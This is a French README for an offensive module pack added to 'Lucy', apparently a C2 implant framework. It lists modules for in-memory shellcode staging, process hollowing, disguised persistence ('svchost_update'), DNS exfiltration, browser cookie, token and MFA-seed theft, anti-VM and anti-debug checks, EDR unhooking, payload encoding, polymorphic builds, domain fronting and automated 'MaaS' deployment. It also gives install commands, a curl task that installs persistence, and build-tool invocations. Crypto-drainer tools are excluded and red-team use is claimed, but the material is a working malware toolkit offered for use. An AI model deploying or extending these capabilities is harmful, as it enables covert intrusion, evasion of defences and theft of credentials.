# Pack 5 — L'Arsenal (Weapons)

Modules offensifs additionnels pour Lucy, 100 % compatibles avec le Module DIY :
chaque fichier est un module autonome (`NAME`, `VERSION`, `DESCRIPTION`, `AUTHOR`,
`DEPENDENCIES`, `OS_COMPAT` + `def run(action, params) -> dict`), seedé dans la DB,
téléchargé et exécuté en mémoire par l'agent à la volée.

> Règle de base : stdlib only, pas d'écriture disque sauf action explicite,
> thread-safe, résultat JSON `{"status", "data", "error"}`.

---

## Installation automatique (une seule commande)

```bash
cd C:\Heybro\PROJECTS\ACTIVE\Lucy
python packs\05-arsenal\install.py
# ou
make arsenal
```

L'installateur :
1. copie `modules/*.py` → `backend/modules/`
2. seed chaque module dans la DB (signature HMAC-SHA256 automatique, `enabled=True`)
3. copie les outils `build/*.py` → `tools/arsenal/`
4. vérifie l'enregistrement (liste les modules actifs)
5. écrit `packs/05-arsenal/INSTALLED.json`

Les modules apparaissent immédiatement dans l'UI (Dashboard → Modules) et dans
l'API `GET /api/v1/modules`. Envoi d'une tâche :

```bash
curl -X POST http://127.0.0.1:8000/api/v1/tasks \
  -H "Authorization: Bearer <jwt>" -H "Content-Type: application/json" \
  -d '{"agent_id":"<id>","module":"persist_kit","action":"install",
       "params":{"method":"registry","name":"svchost_update"}}'
```

---

## Mapping des 50 outils → modules Lucy

### Catégorie 1 — Implants & Backdoors

| # | Outil | Module Lucy | Action |
|---|-------|-------------|--------|
| 1 | ShadowStager | `stager` | `run_dll_mem` / `run_pe_mem` / `run_shellcode` |
| 2 | Go-Ghost | `beacon_kit` | `dns_tunnel` / `dns_txt_exfil` |
| 3 | Rust-Hydra | `persist_kit` | `install` method=`wmi_event` |
| 4 | VoidShell | `exec_kit` | `exec` / `exec_hidden` |
| 5 | Nebula-RAT | core existant | transport WebSocket natif Lucy |
| 6 | Titan-Inject | `inject_kit` | `hollow` / `shellcode_inject` |
| 7 | Rust-Rootkit-X | `persist_kit` | `install` method=`boot` / `scheduled_task` |
| 8 | Go-Beacon-V2 | `beacon_kit` | `tcp_beacon` / `channel_test` |
| 9 | Storm-C2 | core existant | orchestrateur + task queue Lucy |
| 10 | Silent-Exec | `exec_kit` | `exec` (CreateProcessW direct, sans cmd.exe) |
| 11 | Dark-Rust-Agent | `build/polymorph_engine.py` | mutation de build (polymorphisme) |
| 12 | Vector-Zero | core existant | `bof` (chargement BOF) + dispatch modules |
| 13 | Ghost-Link | `beacon_kit` | `smb_check` (pipe SMB) |
| 14 | Iron-Backdoor | `persist_kit` | `install` method=`service` / `registry` |
| 15 | Pulse-Loader | `stager` | `stage_url` + `run_dll_mem` |
| 16 | Titan-Core | core existant | API + orchestration microservices |
| 17 | Void-Agent | core existant | AES-256-GCM natif (crypto agent) |
| 18 | Shadow-Core | `persist_kit` | `install` method=`registry` |
| 19 | Go-Stealth | `traffic_shaper` | `profile` / `jitter` / `headers` |
| 20 | Rust-Sniper | `inject_kit` | `find_pid` / `shellcode_inject` (ciblage) |

### Catégorie 2 — Harvest (credential harvesting red team)

| # | Outil | Module Lucy | Action |
|---|-------|-------------|--------|
| 21 | Ether-Drainer-V3 | EXCLU | vol de wallets tiers - crimeware |
| 22 | Key-Grabber-Rust | `secret_hunter` | `scan_env` / `scan_mem` / `scan_files` |
| 23 | Cookie-Miner | `browser_harvest` | `cookies` / `harvest` |
| 24 | Wallet-Scraper | EXCLU | scan wallets crypto - crimeware |
| 25 | Seed-Phish | EXCLU | phishing seed recovery - crimeware |
| 26 | Crypto-Hook | EXCLU | interception transactions crypto - crimeware |
| 27 | Token-Stealer | `browser_harvest` | `tokens` |
| 28 | Vault-Breaker | `brute_local` | `crack` (audit de mots de passe locaux) |
| 29 | Ledger-Mimic | EXCLU | faux firmware hardware wallet - crimeware |
| 30 | Private-Key-Sniffer | EXCLU | sniffing cles crypto - crimeware |
| 31 | Transaction-Injector | EXCLU | detournement d'adresses - crimeware |
| 32 | Auth-bypass-Stealer | `mfa_harvest` | `totp_seeds` / `clipboard_codes` / `totp_gen` |
| 33 | Session-Hijacker | `browser_harvest` | `replay` / `export_jar` |
| 34 | Profile-Exporter | `browser_harvest` | `profile` |
| 35 | Auto-Drainer-Bot | EXCLU | drain automatise Telegram - crimeware |

### Catégorie 3 — Obfuscation & Infrastructure

| # | Outil | Module Lucy | Action |
|---|-------|-------------|--------|
| 36 | LLVM-Obfuscator-Pro | `build/polymorph_engine.py` | `--llvm-fla --llvm-sub --llvm-bcf` |
| 37 | Polymorph-Engine | `build/polymorph_engine.py` | mutation source/binaire par build |
| 38 | Syscall-Wrapper | `syscall_kit` | `raw_syscall` / `resolve` |
| 39 | Anti-VM-Suite | `anti_vm` | `check` / `verdict` |
| 40 | Debugger-Killer | `anti_debug` | `check` / `kill` |
| 41 | C2-Mesh-Proxy | `build/c2_mesh.py` | generation redirectors nginx/haproxy |
| 42 | NATS-Broker-Covert | `beacon_kit` + `covert_store` | canaux alternatifs + store RAM |
| 43 | Redis-Stealth-Store | `covert_store` | `put` / `get` / `wipe` (RAM only) |
| 44 | Traffic-Shaper | `traffic_shaper` | `profile` / `pad` / `sleep` |
| 45 | Domain-Fronting-Tool | `domain_fronting` | `test` / `scan` / `setup` |
| 46 | API-Unlinker | `syscall_kit` | `unhook` |
| 47 | Memory-Scanner-Hider | `covert_store` | `encrypt` / `decrypt` (memoire chiffree) |
| 48 | Binary-Packer-Custom | `build/binary_packer.py` | build PyInstaller/UPX/zipapp |
| 49 | Payload-Encoder | `build/payload_encoder.py` | XOR/AES/base64/rot13 + stubs |
| 50 | Ghost-Deployer | `build/ghost_deployer.py` | deploiement automatise MaaS |

**Outils exclus (8)** : Ether-Drainer-V3, Wallet-Scraper, Seed-Phish, Crypto-Hook,
Ledger-Mimic, Private-Key-Sniffer, Transaction-Injector, Auto-Drainer-Bot.
Ces outils ciblent des tiers (proprietaires de wallets) et non l'actif teste :
aucune utilite de test d'intrusion, pas integres dans Lucy.
`Key-Grabber` / `Vault-Breaker` / `Auth-bypass-Stealer` sont reimplementes dans un
cadre red team defendable (harvesting de credentials, audit de hash locaux,
capture MFA lors d'engagements autorises).

---

## Contrat module (rappel MODULE_DIY)

```python
NAME = "persist_kit"
VERSION = "1.0.0"
DESCRIPTION = "..."
AUTHOR = "lucy"
DEPENDENCIES = []
OS_COMPAT = ["windows", "linux", "darwin"]

def run(action: str, params: dict) -> dict:
    ...
    return {"status": "completed"|"failed", "data": ..., "error": ...}
```

Signature d'appel cote agent : `run(action, params)` (positionnel). Les modules
sont executes en memoire (`exec`), donc **aucun import relatif**, fichier unique.

---

## Outils de build (`build/`)

Tous en CLI autonome, copies dans `tools/arsenal/` par l'installateur :

| Outil | Usage |
|-------|-------|
| `payload_encoder.py` | `python payload_encoder.py -m xor -k KEY -i shellcode.bin -o stub.py` |
| `binary_packer.py` | `python binary_packer.py --src agent/main.py --name lucy_agent --upx` |
| `polymorph_engine.py` | `python polymorph_engine.py --src agent --seed 42 --llvm-fla --build` |
| `ghost_deployer.py` | `python ghost_deployer.py --hosts hosts.json --dry-run` |
| `c2_mesh.py` | `python c2_mesh.py --c2 1.2.3.4:8000 --fronts cdn1.example.com --out redirectors/` |

---

## Notes

- Les modules sont signes HMAC-SHA256 par le backend au seed (controle d'integrite).
- Le cache agent (`_module_cache`) re-telecharge un module si la version change.
- Les modules Windows (injection, syscalls, persist WMI) retournent un echec
  propre sur Linux/macOS au lieu de crasher l'agent.
